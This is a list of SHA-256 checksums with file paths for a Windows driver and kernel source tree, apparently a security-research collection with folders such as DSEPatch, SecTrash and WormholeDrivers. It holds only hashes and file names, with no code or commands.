33b8666748f027ff93707e6e2a1b52303c3664399000ff18b4a8fe864b731640 *source\DSEPatch\DSEPatch\instdrv.h
f3d863177f35c08cd9c688cbb88ef6ed7e28e6da9bacee3a406f2eef89b2fd24 *source\DSEPatch\DSEPatch\main.c
d1130a87d31c6f62387dcfd5ce1449a68c8dad2bc62674d1cc887804758615ae *source\DSEPatch\DSEPatch\resource.h
d4412e8a4c817aaee8646f58ff4d400a64b6d160bb03eae12b68e6930a676f3e *source\DSEPatch\DSEPatch\resource.rc
32202b7217fcc93e013925436e356d6fdd9717ccfd1b8485d9e7706cf0b4bd6c *source\DSEPatch\DSEPatch\se_patterns.h
323ed4e2cd68dc2eff3c5f9b5b0ca61115ef5b8d7e10396b57dbbc602cee3038 *source\DSEPatch\DSEPatch\sup.c
df93cab018af067fd0a69c5f1a87090504195796619fac0ef561337070bbaa6f *source\DSEPatch\DSEPatch\sup.h
41a6afaf85a029da7bb0e0637550047e0b2430d16cbeb3146347afdf65bf6697 *source\DSEPatch\DSEPatch\vbox.h
a557870fd68b2f9c66f31bf0e7c56eff04bd89dae70f98feb97332eaefbb1919 *source\DSEPatch\DSEPatch\vboxdrv.h
27b89ba25c1620f7f46af4a239d6a18b71b9b689ea33eb7ab099e0b039cdf21f *source\DSEPatch\DSEPatch\cui\cui.c
3058dea6894b1ca7bcff8896b35080c0ddfa1c541e7e505792cbac65dea9d0d9 *source\DSEPatch\DSEPatch\cui\cui.h
8d3fcef10a20e04ece6190e0de3c89f59a9977b774ab90e8a65a363d7302daeb *source\DSEPatch\DSEPatch\hde\hde64.c
fd5b39e2865e12b9525ebda8fd9e9658b341ead5932d1bcb412a189f81ca42ca *source\DSEPatch\DSEPatch\hde\hde64.h
9d37519623d404987300d3f3258148ba9adddfe1bed5f89a0e9e47646819c9c7 *source\DSEPatch\DSEPatch\hde\pstdint.h
0b6c69ad498e67907e0c574ab06123aee4ec30c99fa181099ea929a8d820bfc1 *source\DSEPatch\DSEPatch\hde\table64.h
893b90b942372928009bad64f166c7018701497e4f7cd1753cdc44f76da06707 *source\DSEPatch\DSEPatch\minirtl\cmdline.c
bd6fe82852c4fcdfab559defa33ea394b752a4e4a5ac0653ae20c4a94b0175ed *source\DSEPatch\DSEPatch\minirtl\cmdline.h
b1d539d7fa7583bbdbb90c88bb4809f132c48647bcb21f086c1ace492acba15e *source\DSEPatch\DSEPatch\minirtl\minirtl.h
b9de99d3447bb1a125cb92aa1b3f9b56a59522436f1a1a97f23aac9cee90341c *source\DSEPatch\DSEPatch\minirtl\rtltypes.h
e56e67b10a67f0d5ef4128c7ab0c6cb9ba9966916720525edfa6abf3101dfe13 *source\DSEPatch\DSEPatch\minirtl\u64tohex.c
4d15af5a22467795c5367c3956746d01424795784f62ca3f30e4619c063338a5 *source\DSEPatch\DSEPatch\minirtl\u64tostr.c
f81c975acd016c97776dd3a8e3218e148682b0336ff3fcd77fad6d9b86ddf107 *source\DSEPatch\DSEPatch\minirtl\ultohex.c
9cbedf9b92abaef3ea28de28dd523ac44079592178ef727c7003c339a5a54712 *source\DSEPatch\DSEPatch\minirtl\ultostr.c
83772aa217508279294d91af5cfabec9b5e00b836a2e2f5fe37cf1ebc2905a52 *source\DSEPatch\DSEPatch\minirtl\_strcat.c
2a67c7690ec6df8e233207116b0e4fe76c02ae43595d9e606e123572b6ac88a1 *source\DSEPatch\DSEPatch\minirtl\_strcmp.c
ef1b18997ea473ac8d516ef60efc64b9175418b8f078e088d783fdaef2544969 *source\DSEPatch\DSEPatch\minirtl\_strcmpi.c
969b35213fa23ff50a169e5498a97f28bc6f5820b447b78ec9dc6910dd8cc3e8 *source\DSEPatch\DSEPatch\minirtl\_strcpy.c
27159b8ff67d3f8e6c7fdb4b57b9f57f899bdfedf92cf10276269245c6f4e066 *source\DSEPatch\DSEPatch\minirtl\_strend.c
60f19c6b805801e13824c4d9d44748da8245cd936971411d3d36b873121888eb *source\DSEPatch\DSEPatch\minirtl\_strlen.c
97e0720ed22d2d99e8148aab7ab2cb2cc3df278225669828b2d8d4d9ef856d94 *source\DSEPatch\DSEPatch\minirtl\_strncmp.c
87cc72bb8e3f1534bee09ee278ecd928d975ebb94aeffc767b67249815a0bf3a *source\DSEPatch\DSEPatch\minirtl\_strncmpi.c
0434d69daa20fbf87d829ffc17e43dcc2db3386aff434af888011fdec2f645a4 *source\DSEPatch\DSEPatch\minirtl\_strncpy.c
843927da8a16c09af9fa3fb23a74cf6e2632702c1be8ac0a8f22e0b198265582 *source\DSEPatch\DSEPatch\ntdll\ntos.h
5eaa9db53c00e2febd252c0a4ccb32f448d2fffe905977bbe78d9430577b82fd *source\IntelNal\COPYING
ccdfd4d71f89de07142c72bce835954cea364f5929a855d546642207f368f3cb *source\IntelNal\Kconfig
de1c4c5c7a618d1af2088c2e7247b4d350be651c23353928aa1d009d04b4ae2b *source\IntelNal\Makefile
dadb75115b370155ffff1b9e684ca6ec06e11aa9962efda54b13ca1c884d28be *source\IntelNal\README.md
9adbc65cd0ce56b7d1e64220d53b590a625d1bfc29ac9fa85720a025f72eb73b *source\IntelNal\inc\cardbus_t.h
45f39a7b4d624af3ce346f3f2e7657a321cc6ac0e62fc3c05d0d6fd3416cf9b2 *source\IntelNal\inc\files.txt
4f01378c4c514d9ace57e2375f5a2bcddc673af9a5bbe2c902b56599fa7ff7b4 *source\IntelNal\inc\hwbus_t.h
cc89922c0357b30c00b360986be5d1edb37562737ad96d0af57ae52dea118e77 *source\IntelNal\inc\nal.h
6d6fa9b50b1fc0716b96595f5aa1d4c0aea1faec49efd6a75feea99bcb76e01e *source\IntelNal\inc\nalcodes.h
350b5a116b64fd0f9f41f3c9cae317c03d02754ba94dcb3329f0c55989ddc6af *source\IntelNal\inc\nalioctl.h
058d7841adcca5cdb2ba0438d650ae683b7e39e84bad8e3b2afda59d14f158a2 *source\IntelNal\inc\naltypes.h
3bfc7917712716e84772097fed4703b62d5730cc7f1dda900574f0a3d8f922df *source\IntelNal\inc\osdevice_i.h
9c2f90ed39a5143a147b8992f1c46c8a5c3626c9557955684127e20aaaf2204f *source\IntelNal\inc\os_i.h
3a78dbd33837dd4eddcadbc0e3b07fb1b1ff15de242de046fb3ae1ab817058b7 *source\IntelNal\inc\pci_i.h
53d51a3cf6ac5386095e818a23e25b67ebfa8eb75aeb4a3af5d02768d1d82d52 *source\IntelNal\inc\pci_t.h
2f26052c4a85c540d9e8ea401ae5bc11ff03e438a05077dad5a5d1d1abc47a52 *source\IntelNal\inc\linux\files.txt
d22c9bea91f814e751baa10e5ac288505ea2c059721ae7b71c94734e4a49ac04 *source\IntelNal\inc\linux\linuxdriverdevice_i.h
57f11b7b4b56d9d9389bfbceafbef84147b296b194fcf4041589f4585d9badcb *source\IntelNal\inc\linux\linuxnaldriver.h
5cf8ff5970adf936d1dcb37a5f2ff4b92c059b374d78b35590e30d05582f2317 *source\IntelNal\inc\linux\linuxnalioctl.h
53233d5b89558acc685793706af8d4ee83742d0c7ed47160f6f5c9162c916634 *source\IntelNal\inc\linux\linuxos_i.h
c559a1f364f9a16d16d864d6675d9b0c07db7c00f273d548017e203fde3e61cc *source\IntelNal\inc\linux\linuxpci_i.h
38305ca71c97a09309fb752d6be923ff1084ba8ad34cff2a42312db14ba385c2 *source\IntelNal\src\files.txt
8900c00917ae83cc6dd59b6d9823611018e9f31b8b2546aaf7d50ed7bef6db9f *source\IntelNal\src\iqvlinux.spec
ff18780df76701986910413f54c37c5c0219b40ed4aee5bb762d0d742110716c *source\IntelNal\src\linuxdriverdevice_i.c
d49cf072964227832d8e03178e73b95b559a5bbf14713469a9f33314724d9642 *source\IntelNal\src\linuxdriveros_i.c
5f60c782a90bcd30497b311e81750888d25a53bb0b13e48910415dd57f03f909 *source\IntelNal\src\linuxdriverpci_i.c
fbbe6bf6856a0730050be07da8cb7786d22898b8514d4d2e06324068c422d3e0 *source\IntelNal\src\linuxnaldriver.c
b287774d9d4199fd69091cb206c26e310c422b63a684218e951fd4259e4c0833 *source\IntelNal\src\nalinstall
859afb9fc5506dd351ed32bc995a076592373550292f169286158ac4b1e1f38f *source\IntelNal\src\nalioctldrv.c
36a186d7a7bbe7366d40500a821078cba4c8333d7e18d19e7f0b176b7a709f30 *source\ROS\srvany2\srvany2.sln
29725d248773928b4c19113b827f5a92c74f2231a0ab78a5abe874086aff6a83 *source\ROS\srvany2\srvany2\main.c
e826dc97fb1988c2c0d3419ae431417dc953415dba725cc8edf616abd7c723ab *source\ROS\srvany2\srvany2\srvany2.vcxproj
61143564e31d0227df34a5bc1f9ab5352b992d9df0d445b7c80d8f34c9a939ca *source\ROS\srvany2\srvany2\srvany2.vcxproj.filters
71d814b554ab32787c5a06010305bd17fa9f1175c479eb1f76fdf6d9d2c7e608 *source\ROS\srvany2\srvany2\srvany2.vcxproj.user
893b90b942372928009bad64f166c7018701497e4f7cd1753cdc44f76da06707 *source\ROS\srvany2\srvany2\minirtl\cmdline.c
bd6fe82852c4fcdfab559defa33ea394b752a4e4a5ac0653ae20c4a94b0175ed *source\ROS\srvany2\srvany2\minirtl\cmdline.h
107245437ed86b6f1e839b2d3d9bbadb3d9980046cb5c7001f985fed3627962f *source\ROS\srvany2\srvany2\minirtl\minirtl.h
b9de99d3447bb1a125cb92aa1b3f9b56a59522436f1a1a97f23aac9cee90341c *source\ROS\srvany2\srvany2\minirtl\rtltypes.h
83772aa217508279294d91af5cfabec9b5e00b836a2e2f5fe37cf1ebc2905a52 *source\ROS\srvany2\srvany2\minirtl\_strcat.c
969b35213fa23ff50a169e5498a97f28bc6f5820b447b78ec9dc6910dd8cc3e8 *source\ROS\srvany2\srvany2\minirtl\_strcpy.c
60f19c6b805801e13824c4d9d44748da8245cd936971411d3d36b873121888eb *source\ROS\srvany2\srvany2\minirtl\_strlen.c
8cb4d149a996c797138438a6f3f07226e4543c2854f874e0d9a88c777167aff1 *source\ROS\win32u\win32u.sln
f6ba228e904f70ec66a283ebb0bf8e59fef5bf848102967ccb1bb6b1c3b7c7a1 *source\ROS\win32u\win32u\main.c
d61efe93db8600a57f8c53210ea5c5301ba63113420ca19fa5eed698d6b2c8cc *source\ROS\win32u\win32u\resource.h
b133eef0d2e0345fe1179b93a7fbf392f56b809722738bea3a8b77258965ca2c *source\ROS\win32u\win32u\ver.rc
9201a207bba50888f2bfe187399d6a9a293a9be9f1f43b1a8f9e6c519925a593 *source\ROS\win32u\win32u\w32kcall.h
87fef71b75bafdef8b0f3abb2a54a8750a7dc7e25ad47b3b43201382e7483af0 *source\ROS\win32u\win32u\w32kcall_checked.h
7b103521a6378237fd45bc8be9410b5170097b1ffbe83819a6f74f8e1c28fb24 *source\ROS\win32u\win32u\w32parguments.h
b0d855e750e690f19dc8e649f7359787acaec4dd411fb454faae3378c6b63c4e *source\ROS\win32u\win32u\w32parguments_checked.h
51ed4d57b075c5eb56f789353ef47bfad70fd493997a632cd01c62c973a88f0a *source\ROS\win32u\win32u\win32u.vcxproj
6b4acdf474565add5441d80fef7d4017a89fda5aa03e02d29226836770cc91a3 *source\ROS\win32u\win32u\win32u.vcxproj.filters
e953b026d0f383188c753487df0a4d879fa5da5ba82ac979aa877db84e89a060 *source\ROS\win32u\win32u\win32u.vcxproj.user
775b338ebfacdc95cd35777c4fd74c3db0bc4a1f45f3519ccff3fc9936be5a7e *source\ROS\win32u\win32u\win32u_export.def
00588e4d0ad555ec214f0002546a8013101ea2c54c6b90c19f60af468dfccbe4 *source\ROS\win32u\win32u\win32u_export_checked.def
309c89c13b10dbf0a1b340f5d4510cf429b4c80a6b7eca574e45f32e80f1fe5e *source\SecTrash\asusgio2.c
dc0890b05663d820b4fddb961a72a4e7fde5c9e7d7592db3b72f89543201fd65 *source\SecTrash\bkavsp.c
e4de955f9ec869120942d15b5723b9066e66d79b54fd407f811cedcddeb585db *source\SecTrash\enetech.c
8a4f1da6f4ca6e14983fe38ca75b25dffd2ac647c0dab4531c875fcbac35e51a *source\SecTrash\glckio2.c
fa0fda44043c6035d5a61fd03220e8ce8a7361129a870ea9801f2ffbd8c0ca56 *source\SecTrash\iobitcallbacks.c
3a309de65dbc7e87fcab401d54d65996243e6092f8275403136d110603de755f *source\SecTrash\iobit_winring0.c
c242a6597c9115683e42a925f9f7a06d2018c98a412deeeb35c68231a87f65eb *source\SecTrash\logitech.c
b99ea1b338d0fb5102c7dad95aa3f99fc01bc85f018d8a6438e283d088fd7e0f *source\SecTrash\maxproc64.c
9647861182bde3d19ae09f254d26596b3e588e10ceceb07b5d9635baa0568130 *source\SecTrash\readme.txt
7f3e00c96b8e9d9abff39c7bcc983fa2897ddb6b3c16cae67e78f8aa1a8c7e35 *source\SecTrash\secureaplus.c
7327038c55d3da0f607a38c6a6d027ae3bbb76d9339b4123493baba1cbab63c6 *source\SecTrash\superantispyware.c
27b89ba25c1620f7f46af4a239d6a18b71b9b689ea33eb7ab099e0b039cdf21f *source\StripDebug\cui.c
3058dea6894b1ca7bcff8896b35080c0ddfa1c541e7e505792cbac65dea9d0d9 *source\StripDebug\cui.h
01b27a127d5ffaec2795c48da8d7a67a76ecd53ec7e9517e35f914651203ed36 *source\StripDebug\global.h
41bf6fa2900ec8b1efb0ffb77b149b2fb57b777c242c57cf0e1f456c4cb0b3a5 *source\StripDebug\main.c
fdb7d45dae2e28b2d0146c4a3e4fdeb45af6454b2276131406ded441ce7d6253 *source\StripDebug\StripDebug.sln
52ed59d7ce03b4d0b47b49860a5d95a5ddfc356a6fdce47a346cd7e78705968e *source\StripDebug\StripDebug.vcxproj
4850c5a4ffe24fbd8147b19ed31ad7d600f24d26b56f8e12d3c8d18539ace7d4 *source\StripDebug\StripDebug.vcxproj.filters
c0a23901dc2c0a544b1e50bce3c46469bfaf6f0d48d945dcf2a3d2434046f45f *source\StripDebug\StripDebug.vcxproj.user
893b90b942372928009bad64f166c7018701497e4f7cd1753cdc44f76da06707 *source\StripDebug\minirtl\cmdline.c
bd6fe82852c4fcdfab559defa33ea394b752a4e4a5ac0653ae20c4a94b0175ed *source\StripDebug\minirtl\cmdline.h
107245437ed86b6f1e839b2d3d9bbadb3d9980046cb5c7001f985fed3627962f *source\StripDebug\minirtl\minirtl.h
b9de99d3447bb1a125cb92aa1b3f9b56a59522436f1a1a97f23aac9cee90341c *source\StripDebug\minirtl\rtltypes.h
83772aa217508279294d91af5cfabec9b5e00b836a2e2f5fe37cf1ebc2905a52 *source\StripDebug\minirtl\_strcat.c
969b35213fa23ff50a169e5498a97f28bc6f5820b447b78ec9dc6910dd8cc3e8 *source\StripDebug\minirtl\_strcpy.c
60f19c6b805801e13824c4d9d44748da8245cd936971411d3d36b873121888eb *source\StripDebug\minirtl\_strlen.c
546d794a2ea0f9903874825cb3c0332f402e9937be250934e20b5c740505caf8 *source\wdextract\README.md
4d262988fe9d252191947ab780535d496ed24fa27668cf76c6cb9b6474a391c4 *source\wdextract\wdextract.sln
e633062d041c48b662720a7848cc6b76111b111d0446a9a5da0ed07bc81c6d10 *source\wdextract\wdextract\pch.cpp
db86c540dfe8cbf47e4c98207295872beec3e1eadec7db99a817f4bbb3baaa5f *source\wdextract\wdextract\pch.h
143b26386acef65dd4ea7b1edd8d06f0fb4b4bb33320b1da7d62476304565186 *source\wdextract\wdextract\wdextract.cpp
417c7af745dfe5d824f271b7d220928a1270234e956ea75621f24ac86876be90 *source\wdextract\wdextract\wdextract.vcxproj
a8298edded604535934e1a6838fb5190d2d0f7d86e4f1f614f1c52c86027ce56 *source\wdextract\wdextract\wdextract.vcxproj.filters
1cf0fa0e22d585783d48b3659ebb24464b744e6eda3b00ed9700dbbc33edc2ce *source\wdextract\wdextract\wdextract.vcxproj.user
de38c0a2242acb2b925c42481fff3853cc24efa7ead54b422ee6ed3a203ce2d1 *source\wdextract\wdextract\zconf.h
86c26fd89560f7c2d9ee7852cacdbc7c8334c3090a6e18e366e7618351a0dbf9 *source\wdextract\wdextract\zlib.h
04b99fb5cc1d91b1752fbcb2446db71083ab87af59dd9e0d940cc2ed5a65ef49 *source\wdextract\wdextract\zlibwapi.lib
8600ec27ce22c6209dd8f2a97e7956a589ef436e1258aad70f4f14260aeb2fdc *source\WormholeDrivers\readme.txt
28186ad898f8e77f57e1374ec11c0cbaee4d477a5ed15d0ae3ed07eff947588a *source\WormholeDrivers\MAPMEM\DIRS
a54b7169a4cc08746c2ca0097b25b91f9d129d8873b1a33aefaec9250b137267 *source\WormholeDrivers\MAPMEM\README.TXT
e85d21d6a3914bfc6581f3081aa7c32c73230b0dc1589886a8ad49017f535c23 *source\WormholeDrivers\MAPMEM\EXE\MAKEFILE
20b70c9512d2eeec7cd1e53fcf831c795641301ab7b27c56af0dafdab4ed5ce4 *source\WormholeDrivers\MAPMEM\EXE\MAPTEST.C
16d154f0a4b0fc36bf0839cc8b834bd5d09b1cbe63d8ed23b59fe129b9a56229 *source\WormholeDrivers\MAPMEM\EXE\MAPTEST.MAK
e4a0725c0915159e33f31f93d0cb712d6ce1fae1c7b19ba81b26151d3cdbcb13 *source\WormholeDrivers\MAPMEM\EXE\SOURCES
e85d21d6a3914bfc6581f3081aa7c32c73230b0dc1589886a8ad49017f535c23 *source\WormholeDrivers\MAPMEM\SYS\MAKEFILE
95fa3f4850957fff97971687e5dfc80daf8077485d85e1ba22b412aef1e97c8a *source\WormholeDrivers\MAPMEM\SYS\MAPMEM.C
0789d3140cffa2b412bd546f43c71faf3bd5b435b768b886ee6b88a6be4093d3 *source\WormholeDrivers\MAPMEM\SYS\MAPMEM.H
4009c2c984411cdf4eb4994a9f3ed5b549b8681e822b761a636b3c7824037f98 *source\WormholeDrivers\MAPMEM\SYS\MAPMEM.INI
5ad7f7c803dea1c4898bb4c4513673a8abaf113619a7af8d56d320b6e5ae5588 *source\WormholeDrivers\MAPMEM\SYS\SOURCES
2efaeb56f4ae45c87ab18d45ac5e46653ea4d083a1b7c6641f791a97e72ff427 *source\WormholeDrivers\PHYMEM\LICENSE
3fc38656c0699262eb5a33b02f3771b858ce076a3efe63cf0d1c5f6ba5258fb3 *source\WormholeDrivers\PHYMEM\LICENSE.html
4d5554076b354c032f8465bdb23909119b8d508d2bcea42b5bc388d21a14a13d *source\WormholeDrivers\PHYMEM\PCIFlt\DebugPrint.c
02f7a2c565be69d76badd96961bb1ef9bbe80fa468ba1be8cd3503786b5e5f62 *source\WormholeDrivers\PHYMEM\PCIFlt\DebugPrint.h
ab2e8f27a2c163e5e3d521c88e5aaf857af881f7dc88cb1e0c9f8f3cb070dfbe *source\WormholeDrivers\PHYMEM\PCIFlt\PCIFilter.c
ed6538618a2f48fdc70dca667034654a059be09589b9b893f958ad1d3c737feb *source\WormholeDrivers\PHYMEM\PCIFlt\PCIFilter.h
a32f3b88cd2b2baa24f7ef9e7914a11a86d9000b54c0669efda4cb64a8276a58 *source\WormholeDrivers\PHYMEM\PCIFlt\PCIFlt.dsp
e3ae8c5dc0b2afcdc47b2c0eb4db73f6b5cb6a9a075258419a8b9e588907fa46 *source\WormholeDrivers\PHYMEM\PCIFlt\PCIFlt.dsw
343cf7bc9f264289026a4108c88f2b533d8ce7d9524363632cba6f8769d2398c *source\WormholeDrivers\PHYMEM\PCIFlt\Release\PCIFilter.inf
a9bd725598b10d1f39b758edcbbfad59a839927880a98c9fc827f743202724a7 *source\WormholeDrivers\PHYMEM\PCIFlt\Release\PCIFlt.sys
c6bb086d352ddc79cac80b238daacf5911cef1ff8f3b707034d00fd7213e0932 *source\WormholeDrivers\PHYMEM\PhyMem\driver\AccessBus.c
4d5554076b354c032f8465bdb23909119b8d508d2bcea42b5bc388d21a14a13d *source\WormholeDrivers\PHYMEM\PhyMem\driver\DebugPrint.c
02f7a2c565be69d76badd96961bb1ef9bbe80fa468ba1be8cd3503786b5e5f62 *source\WormholeDrivers\PHYMEM\PhyMem\driver\DebugPrint.h
864af7fe8daf50f21d6dded881a3a4844978e338072443fb9d8c29019d4df081 *source\WormholeDrivers\PHYMEM\PhyMem\driver\phymem.c
5b9741ad07fdd5d306a03fc552fd44c5fcbb135b33197e9babdebdb6b9aa87c2 *source\WormholeDrivers\PHYMEM\PhyMem\driver\phymem.dsp
c828323f9a4fb15b1e829da58e94137cd9489676ab256904101ab6d89ac8de4d *source\WormholeDrivers\PHYMEM\PhyMem\driver\phymem.dsw
e467a647f7944d834ecdd874371a38ca942291b91700c9d02fd40fab97e91f63 *source\WormholeDrivers\PHYMEM\PhyMem\driver\phymem.h
7c1b465068d2fa0dc08a300097c16785ef559f3320d093460121953c060f6eb0 *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\initdrv.cpp
e467a647f7944d834ecdd874371a38ca942291b91700c9d02fd40fab97e91f63 *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\phymem.h
6b03abe4722ccb6720c0b5fca0698a9af0335dd17742fa9532cdbe5e0800d28b *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\pmdll.cpp
2444113443bc7ac5b3221c3933fe5b42e27b163147348d6928d85ba56abf4c19 *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\pmdll.dsp
9f039775d20dcb6df78474c5672d72983c2a7a3df0df3c8f569b5b7ef001305c *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\pmdll.dsw
dde1ef01a261a21c08d37d2709107ec8fb6192db20fcdc56e3427029e1d9de6b *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\pmdll.h
d290285e9a6ed57b89a30f51184209af5ea8bb15739fec6930f52b0b0e3433df *source\WormholeDrivers\PHYMEM\PhyMem\pmdll\Release\pmdll.lib
dde1ef01a261a21c08d37d2709107ec8fb6192db20fcdc56e3427029e1d9de6b *source\WormholeDrivers\PHYMEM\PhyMem\test\pmdll.h
a7ff39330a29d21c36ca1b3eab46b96b3a237f7248a3071d7ff45c5d1f409971 *source\WormholeDrivers\PHYMEM\PhyMem\test\pmdll.lib
b403caf25c81f37e83c4f5ba6a70477434d0a26f29486b04f14bc002b10d1243 *source\WormholeDrivers\PHYMEM\PhyMem\test\test.cpp
0d4f4c4360c3a35b5a11fb49cce583178fcbcf11a05998a3943f030c94d2a833 *source\WormholeDrivers\PHYMEM\PhyMem\test\test.dsp
f601d5018838d5bc836a3e83dcf78d96ee9168d071bb1ff100bb46d03aef74c4 *source\WormholeDrivers\PHYMEM\PhyMem\test\test.dsw
52da81de07306aa8eb1ef35622b217db37fa12c8a1d8218d66f2a66ee4d276fa *source\WormholeDrivers\WINIO\.gitignore
00c9349990ca00521d79d0315e95e944c96e5ae454bc569340baad31ea79db14 *source\WormholeDrivers\WINIO\LICENSE
010a38a4dde570660535c6a440b7ba5cfabe258c336c9608f196d92c8bc35290 *source\WormholeDrivers\WINIO\README.md
13a83500b9092891f4f7dfb99f5a2b9fe0f937d2deaafedb7ca2892b2c0a04af *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys.sln
5ac3e2b574ed7922de3c365b9032359a48bad92bbba99f19e958dc677eda6f4a *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys.suo
366e7eff80652f7e5942b07ad6eb8697c9c3615f98da86ab0c40cecc0ab6b797 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\DumpPhys.csproj
3d8525da7d16c956a051fda844de190eda4bf1373627f39261d4ac372acaf8db *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\DumpPhys.manifest
45ff39c6826ffc3a0ec7144d2ff50ca932b962bda35ebb8f50638f31c5aec1cf *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Form1.cs
7e52b42b7a98ca1e21e22fc5128facc4a3771cb6aad8086605255cdcf3e3fd34 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Form1.Designer.cs
031312dd30d0f17bd38db27eb7353672d378567347c872461d281ef158c70b5a *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Form1.resx
c481a3432f1ee47d0013cd35a0209c5085292fe93a405d56ce6402e09f0db6b0 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Program.cs
08d745ea4bfd7e241a4eb878f0bde4489552054a9164f0ea4985f39b60c9d659 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Properties\AssemblyInfo.cs
a7bac7f5279fcb52740f8dd32fa519fc4f1bb2c3c469b597cb457462398edbff *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Properties\Resources.Designer.cs
66b5ebd1b0fc73f041ba669ce2184f6f471d5e3524efa34ca31233e9f5395262 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Properties\Resources.resx
0712d8c7621f857edde9040c5083761db0ff9821f7b021bb8fd7f65a7ef1bdf5 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Properties\Settings.Designer.cs
f6a4290723520caddd934b8800319c7ca6cc7eeab647059ec89b7a13b1513265 *source\WormholeDrivers\WINIO\Samples\DumpPhys\DumpPhys\Properties\Settings.settings
4e41dfc1a8d54c05368a38eff90ace0f68ae42a6bb49d34ab90140c13f9afe6e *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort.sln
9153af3c95384a07ef108ec4743addec867144cdfff7304673518434fa8decd1 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort.suo
c8884c5f45727e5c87eb239f7968eb93c2a44599323bebaef7b8e21f7c3a5fb6 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\DumpPort.csproj
3d8525da7d16c956a051fda844de190eda4bf1373627f39261d4ac372acaf8db *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\DumpPort.manifest
b89df8e4ccb57552bbf7a4f2ac4e323ca06a24554312ba07cd131a0dbc99912c *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Form1.cs
d1d33b526dfcd0886308828ff550a93c01891450a4df879d213243f30d09b15f *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Form1.Designer.cs
031312dd30d0f17bd38db27eb7353672d378567347c872461d281ef158c70b5a *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Form1.resx
c0caeab3885f7f38630fd2d3a03f45d8eb697c2564fd1edf4661d31a93f02fc6 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Program.cs
2a2fe3d2ab40a296664c34a15fecb88591e09d79092475df7ac9808af619d949 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Properties\AssemblyInfo.cs
589a7668016429e45b71eb3e3e748a48ac31de932693bc8521f207ccac01d2ca *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Properties\Resources.Designer.cs
66b5ebd1b0fc73f041ba669ce2184f6f471d5e3524efa34ca31233e9f5395262 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Properties\Resources.resx
64dceed2ee22349214dfd84d945c6dbc220b88fd5319a4ae120cbc4075f66f50 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Properties\Settings.Designer.cs
f6a4290723520caddd934b8800319c7ca6cc7eeab647059ec89b7a13b1513265 *source\WormholeDrivers\WINIO\Samples\DumpPort\DumpPort\Properties\Settings.settings
963e9d3ba2d418e60720d6a8d3fe541e1fc48f2b0a957fbff78cceb16eaf78cd *source\WormholeDrivers\WINIO\Source\Dll\InstDrv.cpp
e7d21744b1382899ceac39fe241efff5dbac36d3b1a92e67d8615197f7664952 *source\WormholeDrivers\WINIO\Source\Dll\Phys32.cpp
9b314756f8d3dbf03058db5190b83e61b9edef6594e4ffe9245ab0234577f598 *source\WormholeDrivers\WINIO\Source\Dll\Phys32.h
57b33b359170b24a92bd3a52fb5a56ce6faed8214dc6c3e53caa0baa3602adec *source\WormholeDrivers\WINIO\Source\Dll\Port32.cpp
db2c0b50cc9734cc901a3033173e49d2842b541f91dce36d5324c4cef85c7419 *source\WormholeDrivers\WINIO\Source\Dll\Port32.h
9c7c8f370adbdebf1b9c3d3ac5ecd1dc65800816d68b82e006daf95fcbaa478c *source\WormholeDrivers\WINIO\Source\Dll\resource.h
209d03a34cf590813ba9bdf4fbecfd91121fc9b7747f898c7029b8d07aba691f *source\WormholeDrivers\WINIO\Source\Dll\WinIo.aps
1f1d3761e9b3b15cd8c57d45f2965ba9803154fbd41c3dc608983876cfd66375 *source\WormholeDrivers\WINIO\Source\Dll\WinIo.cpp
19590bba9112eb14a7c3a4c422bcef90b26f2389225fda925c560847bb75f3ef *source\WormholeDrivers\WINIO\Source\Dll\WinIo.def
eb37b70b67b7c249fe8d64798457100eb0309f0fec8e85f8faaac54ad445a74d *source\WormholeDrivers\WINIO\Source\Dll\winio.h
8cdeca8a98a433692488b9902a15f53dbea95a934003b4393d29876e0990e3b0 *source\WormholeDrivers\WINIO\Source\Dll\WinIo.rc
4080316e153ebd8d67399bed9fe2f445040dfa71ad23cc41e13065a670d6f8a8 *source\WormholeDrivers\WINIO\Source\Dll\WinIo.sln
137112e46b6cf5ec13afcd28ecce04c9287690225b4bcf7d88a13398d4bf5d5c *source\WormholeDrivers\WINIO\Source\Dll\WinIo.suo
8e8553c50a5736703f3f245239717de2018f9aaba11b9b82d117b6aace60b117 *source\WormholeDrivers\WINIO\Source\Dll\WinIo.vcproj
0350066fc7cd89f3db46317311dec536364555c3d60a9c39226cac5a7e53531e *source\WormholeDrivers\WINIO\Source\Drv\MAKEFILE
c0be4ba991123c13d72a1c9a16adb4a03346bb04769682104c4baa25e9fae730 *source\WormholeDrivers\WINIO\Source\Drv\SOURCES
de793659e6f9ba96edf0ee1068ed09f52b9daa4e95df12cbcb8691fad9dbeb51 *source\WormholeDrivers\WINIO\Source\Drv\WinIo.c
7b922c115e5edde6732292f352e6d003ed71c5b0748ec67bac97e9cb85e9d173 *source\WormholeDrivers\WINIO\Source\Drv\winio_nt.h
